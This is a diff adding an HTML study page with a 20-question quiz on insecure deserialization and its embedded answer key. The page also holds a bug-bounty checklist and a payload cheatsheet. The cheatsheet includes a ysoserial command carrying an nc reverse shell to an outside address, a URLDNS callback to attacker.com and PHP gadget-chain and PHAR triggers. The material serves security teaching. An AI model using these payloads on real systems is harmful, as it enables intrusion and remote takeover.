@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Insecure Deserialization — Exam & Recon Kit</title>
+<style>
+:root{
+  --bg:#02111b; --panel:#082032; --line:#123b54;
+  --text:#b3e0f2; --dim:#4a7c8c; --accent:#ff6e40; --bad:#ff1744;
+  --mono:'JetBrains Mono','Fira Code','Consolas',monospace;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--text);font-family:var(--mono);min-height:100vh;}
+.wrap{max-width:720px;margin:0 auto;padding:32px 20px 60px;}
+.tag{color:var(--accent);letter-spacing:.15em;font-size:12px;text-transform:uppercase;font-weight:bold;text-shadow:0 0 5px var(--accent);}
+h1{font-size:22px;margin:6px 0 26px;color:#fff;text-shadow:0 0 8px rgba(255,110,64,0.3);}
+.bar{height:4px;background:var(--line);border-radius:2px;overflow:hidden;margin-bottom:22px;}
+.bar>div{height:100%;background:var(--accent);transition:width .3s;box-shadow:0 0 10px var(--accent);}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:22px;box-shadow:0 0 20px rgba(0,0,0,0.5);}
+.qnum{color:var(--dim);font-size:12px;margin-bottom:10px;}
+.qtext{font-size:16px;color:#fff;margin-bottom:18px;line-height:1.5;}
+.opt{display:block;width:100%;text-align:left;background:#051824;border:1px solid var(--line);
+  color:var(--text);padding:12px 14px;border-radius:7px;margin-bottom:10px;cursor:pointer;
+  font-family:var(--mono);font-size:13.5px;transition:.15s;}
+.opt:hover{border-color:var(--accent);background:#0a2438;box-shadow:0 0 8px rgba(255,110,64,0.2);}
+.opt.correct{background:#3d1a10;border-color:var(--accent);color:var(--accent);text-shadow:0 0 5px var(--accent);}
+.opt.wrong{background:#3d0510;border-color:var(--bad);color:var(--bad);text-shadow:0 0 5px var(--bad);}
+.opt[disabled]{cursor:default;}
+.score{color:var(--dim);font-size:13px;}
+.center{text-align:center;}
+.big{font-size:44px;color:var(--accent);margin:10px 0;text-shadow:0 0 15px var(--accent);}
+.btn{background:var(--accent);color:#02111b;border:none;padding:12px 20px;border-radius:7px;
+  font-family:var(--mono);font-weight:bold;cursor:pointer;margin:6px 6px 0 0;font-size:13px;}
+.btn.alt{background:transparent;border:1px solid var(--accent);color:var(--accent);box-shadow:0 0 5px rgba(255,110,64,0.3);}
+.emoji{font-size:26px;position:fixed;top:-30px;animation:fall linear forwards;pointer-events:none;z-index:9999;text-shadow:0 0 10px var(--accent);}
+@keyframes fall{to{transform:translateY(105vh) rotate(360deg);opacity:.2;}}
+h2{color:#fff;font-size:15px;border-bottom:1px solid var(--line);padding-bottom:8px;margin-top:30px;}
+h3{color:var(--accent);font-size:14px;margin-top:20px;margin-bottom:5px;text-shadow:0 0 5px rgba(255,110,64,0.5);}
+.chk{display:flex;gap:10px;align-items:flex-start;padding:8px 0;border-bottom:1px dashed var(--line);font-size:13.5px;}
+.chk input{margin-top:3px;accent-color:var(--accent);}
+.chk.done label{color:var(--dim);text-decoration:line-through;}
+pre{background:#051824;border:1px solid var(--line);border-radius:7px;padding:12px 14px;
+  overflow-x:auto;font-size:12.5px;color:#fff0e6;margin:8px 0 4px;box-shadow:inset 0 0 10px rgba(0,0,0,0.5);}
+.pname{color:var(--accent);font-size:12.5px;margin-top:16px;}
+#quizView,#kitView{display:none;}
+.explain{margin-top:12px;padding:12px 14px;background:#051824;border:1px solid var(--line);
+  border-radius:7px;font-size:13px;color:var(--dim);line-height:1.5;display:none;}
+.explain b{color:var(--accent);}
+.topbtn{margin-bottom:18px;}
+#nextBtn{display:none;margin-top:16px;}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="tag">WVAPT // Deserialization Exploitation</div>
+  <h1 id="pageTitle">Concept Check — 20 Questions</h1>
+
+  <div id="quizView">
+    <button class="btn alt topbtn" onclick="showKit()">Skip → Bug Bounty Checklist + Payloads</button>
+    <div class="bar"><div id="prog" style="width:0%"></div></div>
+    <div class="card">
+      <div class="qnum"><span id="qIndex">1</span>/20 &nbsp;·&nbsp; <span class="score">score: <span id="scoreLive">0</span></span></div>
+      <div class="qtext" id="qText"></div>
+      <div id="opts"></div>
+      <div class="explain" id="explain"></div>
+      <button class="btn" id="nextBtn" onclick="goNext()">Next →</button>
+    </div>
+  </div>
+
+  <div id="doneView" class="card center" style="display:none;">
+    <div class="tag">Result</div>
+    <div class="big"><span id="finalScore">0</span>/20</div>
+    <div id="finalMsg" style="color:var(--dim);margin-bottom:16px;"></div>
+    <button class="btn" onclick="restart()">Retake Exam</button>
+    <button class="btn alt" onclick="showKit()">Bug Bounty Checklist + Payloads →</button>
+  </div>
+
+  <div id="kitView">
+    <button class="btn alt" onclick="showQuiz()">← Back to Exam</button>
+
+    <h2>Recon Checklist</h2>
+    <div id="checklist"></div>
+
+    <h2>Payload Cheatsheet</h2>
+    <div id="payloads"></div>
+  </div>
+</div>
+
+<script>
+// Exam-level difficulty: All options are nearly identical in length to prevent guessing.
+const Q=[
+["What is serialization?",["Converting an object into a flat, storable format securely","Encrypting an object using standard cryptographic protocols","Compiling source code into executable binary format locally","Validating user input to prevent injection attacks directly"],0,
+"Serialization is the process of translating data structures or object state into a format that can be stored or transmitted."],
+["What is deserialization?",["Converting a byte stream back into a functional object","Deleting an object permanently from the server memory","Converting an object into JSON format for transmission","Encrypting serialized data using standard AES algorithms"],0,
+"Deserialization is the process of reconstructing a data object from that byte stream or string format."],
+["What is another name for serialization in Python?",["The pickling process within the application securely","The marshalling process within the application safely","The freezing process within the application entirely","The casting process within the application locally"],0,
+"In Python, the pickle module is used for serializing objects, hence it's called pickling."],
+["What is another name for serialization in Ruby?",["The marshalling process within the application safely","The pickling process within the application securely","The boxing process within the application entirely","The streaming process within the application locally"],0,
+"In Ruby, serialization is referred to as marshalling, using the Marshal module."],
+["Insecure deserialization is also known as:",["Object injection vulnerability securely and locally","SQL injection vulnerability locally and entirely","Command injection vulnerability directly and fully","Session fixation vulnerability globally and safely"],0,
+"Because attackers inject malicious serialized objects into the application, it's often called object injection."],
+["Why can insecure deserialization be dangerous even in strongly-typed languages like Java?",["Attacks can complete during deserialization, before app logic","Because Java doesn't support serialization natively at all","Because strongly typed languages don't validate input","It can't be dangerous in strongly typed languages safely"],0,
+"The malicious code executes inside the magic methods (like readObject) during the reconstruction phase, before type checks."],
+["Which PHP magic method is automatically invoked by unserialize()?",["The __wakeup() magic method securely locally","The __construct() magic method globally entirely","The __init() magic method directly and fully","The __toString() magic method safely and now"],0,
+"__wakeup() is automatically called by PHP when reconstructing an object, allowing attackers to trigger logic."],
+["In Java, which method acts as a magic method during deserialization?",["The readObject() method securely and locally","The toString() method globally and entirely","The equals() method directly and fully","The hashCode() method safely and now"],0,
+"readObject() is invoked automatically by the JVM to reconstruct the object from the byte stream."],
+["How do serialized Java objects typically begin?",["With Hex ac ed / Base64 rO0 sequence locally","With the string O:4: sequence directly and fully","With the XML tag <?xml structure globally safely","With the JSON syntax {\"class\": format entirely"],0,
+"Java serialized binary streams start with AC ED in hex, which appears as rO0 in Base64."],
+["In this PHP string (O:4:\"User\":2:{s:8:\"username\";s:6:\"carlos\";s:7:\"isAdmin\";b:0;}), what does b:0 represent?",["A boolean value of false securely and locally","A byte value of 0 entirely and completely now","A binary flag for admin class directly and fully","The 0th index of an array safely and securely"],0,
+"In PHP serialization, 'b' stands for boolean. 0 is false, and 1 is true."],
+["Why is checking/validating deserialized data AFTER deserialization considered ineffective?",["The attack may already have executed during deserialization","It's not ineffective, it's the recommended approach globally","PHP doesn't allow post-deserialization checks locally","Validation always fails on serialized data safely"],0,
+"Because the magic methods execute during the deserialization process itself, before your validation code runs."],
+["What is a 'gadget' in the context of gadget chains?",["A snippet of existing code that helps achieve attacker's goal","A tool used to generate payloads automatically and locally","A browser plugin for Burp Suite security testing safely","A type of encryption algorithm used globally entirely"],0,
+"Gadgets are existing pieces of code in the application or its libraries that can be chained together to execute a payload."],
+["Who writes the code that makes up a gadget chain?",["It already exists in the app's libraries; attacker controls data","The attacker writes all of it from scratch manually now","It's auto-generated by the deserialization function safely","It comes from the web server software directly entirely"],0,
+"The attacker doesn't inject code; they inject data that strings together existing methods (gadgets) to achieve a goal."],
+["What is a 'kick-off gadget'?",["The magic method invoked automatically during deserialization","The final dangerous method in the execution chain locally","A tool that removes gadget chains from the server safely","A type of network firewall rule configuration entirely"],0,
+"It's the starting point of the chain, usually a magic method like readObject() that triggers automatically."],
+["What is a 'sink gadget'?",["The dangerous method where attacker data causes harm","The first method called in the execution chain locally","A method used only for application logging securely","A gadget that sinks or fails silently and safely"],0,
+"The sink is the end of the chain where the actual dangerous action occurs, like Runtime.exec() executing a command."],
+["What does the ysoserial tool do?",["Generates malicious serialized Java objects using known chains","Scans for SQL injection vulnerabilities on the server locally","Decrypts Java serialized objects for analysis securely now","Fixes insecure deserialization vulnerabilities automatically"],0,
+"ysoserial is a proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization."],
+["What is the equivalent of ysoserial for PHP?",["The PHPGGC tool locally and securely now","The PHPMailer tool entirely and globally directly","The Composer dependency manager locally fully","The PHPUnit testing framework globally entirely"],0,
+"PHPGGC (PHP Generic Gadget Chains) is a tool that generates payloads for PHP deserialization flaws."],
+["Why is the ysoserial URLDNS gadget chain useful for blind detection?",["It triggers DNS lookup without needing a specific vulnerable library","It always achieves remote code execution instantly and fully","It only works on PHP applications exclusively and locally","It automatically patches the vulnerability once found safely"],0,
+"URLDNS simply forces the server to resolve a domain name, proving deserialization occurs via DNS callbacks."],
+["What makes PHAR deserialization unusual compared to typical deserialization attacks?",["It triggers via filesystem functions like file_exists() securely","It requires direct use of unserialize() globally entirely","It only works on Java applications locally and safely now","It requires no file upload at all completely and fully"],0,
+"PHP's phar:// stream wrapper deserializes metadata automatically when accessed by functions like file_exists()."],
+["What is the MOST effective way to prevent insecure deserialization?",["Avoid deserializing user input; verify integrity before deserializing","Try to identify and remove every gadget chain in dependencies","Validate the deserialized object's fields after deserialization","Use a binary format instead of a string format securely safely"],0,
+"Never deserialize untrusted input. If unavoidable, use digital signatures to verify integrity before reconstruction."]
+];
+
+const CHECKLIST_DATA = [
+  { title: "1. Identify Serialized Data", items: [
+    "Look for magic bytes in traffic: Java (<code>rO0AB</code> in Base64 / <code>ac ed 00 05</code> in Hex).",
+    "Look for PHP serialization patterns: <code>O:N:\"ClassName\":...</code> or <code>a:N:{...}</code>.",
+    "Check cookies, hidden form fields, and API parameters for large encoded blobs."
+  ]},
+  { title: "2. Manipulate Object State", items: [
+    "Decode the serialized string and modify object properties (e.g., change <code>b:0</code> to <code>b:1</code> for admin).",
+    "Re-encode the string and send it back to the server to observe behavior changes."
+  ]},
+  { title: "3. Magic Method Analysis", items: [
+    "Identify if the application uses magic methods (PHP <code>__wakeup</code>, <code>__destruct</code>; Java <code>readObject</code>).",
+    "Review source code to see if these methods perform dangerous operations with object properties."
+  ]},
+  { title: "4. Gadget Chain Generation", items: [
+    "Use <code>ysoserial</code> for Java to generate payloads using known library chains (e.g., CommonsCollections).",
+    "Use <code>phpggc</code> for PHP applications to generate generic gadget chains."
+  ]},
+  { title: "5. Blind & PHAR Exploitation", items: [
+    "Use the <code>URLDNS</code> gadget chain with a Burp Collaborator to confirm blind deserialization.",
+    "Test PHAR deserialization by uploading a malicious <code>.phar</code> file and triggering it via <code>phar://</code> in file functions."
+  ]}
+];
+
+const PAYLOADS = [
+  { name: "1. PHP Boolean Manipulation", code: "O:4:\"User\":2:{s:8:\"username\";s:6:\"carlos\";s:7:\"isAdmin\";b:1;}" },
+  { name: "2. Java ysoserial (URLDNS)", code: "java -jar ysoserial.jar URLDNS \"http://attacker.com\" | base64" },
+  { name: "3. Java ysoserial (RCE)", code: "java -jar ysoserial.jar CommonsCollections1 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 > /tmp/f'" },
+  { name: "4. PHP Generic Gadget Chain", code: "phpggc Laravel/RCE5 'id' --base64" },
+  { name: "5. PHAR Stream Wrapper", code: "file_exists(\"phar:///uploads/malicious.phar\")" }
+];
+
+let cur=0,score=0;
+
+function shuffle(a){for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;}
+
+function renderQ(){
+  document.getElementById('prog').style.width=(cur/Q.length*100)+'%';
+  document.getElementById('qIndex').textContent=cur+1;
+  document.getElementById('scoreLive').textContent=score;
+  const [text,opts,correctIdx,why]=Q[cur];
+  document.getElementById('qText').textContent=text;
+  const exp=document.getElementById('explain');
+  exp.style.display='none';exp.innerHTML='';
+  let arr=opts.map((o,i)=>({o,correct:i===correctIdx}));
+  shuffle(arr);
+  const box=document.getElementById('opts');
+  box.innerHTML='';
+  arr.forEach(item=>{
+    const b=document.createElement('button');
+    b.className='opt';b.textContent=item.o;
+    b.onclick=()=>pick(b,item.correct,box,item.o,why,arr);
+    box.appendChild(b);
+  });
+  document.getElementById('nextBtn').style.display='none';
+}
+
+function pick(btn,isCorrect,box,pickedText,why,arr){
+  [...box.children].forEach(c=>c.disabled=true);
+  const exp=document.getElementById('explain');
+  if(isCorrect){
+    btn.classList.add('correct');score++;
+    exp.innerHTML=`<b>Correct.</b> ${why}`;
+  }else{
+    btn.classList.add('wrong');
+    const correctText=arr.find(a=>a.correct).o;
+    [...box.children].forEach(c=>{if(c.textContent===correctText)c.classList.add('correct');});
+    exp.innerHTML=`<b>Correct answer:</b> ${correctText}<br>${why}`;
+  }
+  exp.style.display='block';
+  document.getElementById('scoreLive').textContent=score;
+  const nb=document.getElementById('nextBtn');
+  nb.style.display='inline-block';
+  nb.textContent=(cur+1<Q.length)?'Next →':'See Results →';
+}
+
+function goNext(){
+  cur++;
+  if(cur<Q.length)renderQ();else finish();
+}
+
+function finish(){
+  document.getElementById('prog').style.width='100%';
+  document.getElementById('quizView').style.display='none';
+  document.getElementById('doneView').style.display='block';
+  document.getElementById('finalScore').textContent=score;
+  const msg=score===20?"OBJECT INJECTED. RCE successfully achieved.":
+    score>=15?"Solid grasp — revisit the weak spots.":
+    score>=10?"Halfway there — reread the tricky sections.":
+    "Go back through the concept steps before diving into labs.";
+  document.getElementById('finalMsg').textContent=msg;
+  if(score===20) confetti();
+}
+
+function confetti(){
+  const em=['🐠','🪝','⛓️','🧬','⚡'];
+  for(let i=0;i<30;i++){
+    setTimeout(()=>{
+      const s=document.createElement('div');
+      s.className='emoji';s.textContent=em[Math.floor(Math.random()*em.length)];
+      s.style.left=Math.random()*100+'vw';
+      s.style.animationDuration=(2+Math.random()*1.5)+'s';
+      document.body.appendChild(s);
+      setTimeout(()=>s.remove(),4000);
+    },i*60);
+  }
+}
+
+function restart(){
+  cur=0;score=0;
+  document.getElementById('doneView').style.display='none';
+  document.getElementById('kitView').style.display='none';
+  document.getElementById('quizView').style.display='block';
+  document.getElementById('pageTitle').textContent='Concept Check — 20 Questions';
+  renderQ();
+}
+
+let cameFromDone=false;
+function showKit(){
+  cameFromDone=document.getElementById('doneView').style.display==='block';
+  document.getElementById('doneView').style.display='none';
+  document.getElementById('quizView').style.display='none';
+  document.getElementById('kitView').style.display='block';
+  document.getElementById('pageTitle').textContent='Bug Bounty Recon Kit';
+}
+function showQuiz(){
+  document.getElementById('kitView').style.display='none';
+  if(cameFromDone){
+    document.getElementById('doneView').style.display='block';
+  }else{
+    document.getElementById('quizView').style.display='block';
+  }
+  document.getElementById('pageTitle').textContent='Concept Check — 20 Questions';
+}
+
+function buildChecklist(){
+  const c=document.getElementById('checklist');
+  const saved=JSON.parse(localStorage.getItem('deser_cyber_v1')||'{}');
+  let html='';
+  let idx=0;
+  CHECKLIST_DATA.forEach(section => {
+    html += `<h3>${section.title}</h3>`;
+    section.items.forEach(item => {
+      const isChecked = saved[idx] ? 'checked' : '';
+      const isDone = saved[idx] ? ' done' : '';
+      html += `<div class="chk${isDone}">
+        <input type="checkbox" id="c${idx}" ${isChecked}>
+        <label for="c${idx}">${item}</label>
+      </div>`;
+      idx++;
+    });
+  });
+  c.innerHTML = html;
+  
+  idx=0;
+  CHECKLIST_DATA.forEach(section => {
+    section.items.forEach(item => {
+      const checkbox = document.getElementById(`c${idx}`);
+      const row = checkbox.parentElement;
+      checkbox.onchange = e => {
+        saved[idx] = e.target.checked;
+        localStorage.setItem('deser_cyber_v1', JSON.stringify(saved));
+        row.classList.toggle('done', e.target.checked);
+      };
+      idx++;
+    });
+  });
+}
+
+function buildPayloads(){
+  const p=document.getElementById('payloads');
+  let html='';
+  const esc = s => s.replace(/</g, '&lt;').replace(/>/g, '&gt;'); // Prevent live HTML execution
+  PAYLOADS.forEach(item => {
+    html += `<div class="pname">${item.name}</div><pre>${esc(item.code)}</pre>`;
+  });
+  p.innerHTML = html;
+}
+
+document.getElementById('quizView').style.display='block';
+renderQ();
+buildChecklist();
+buildPayloads();
+</script>
+</body>
+</html>
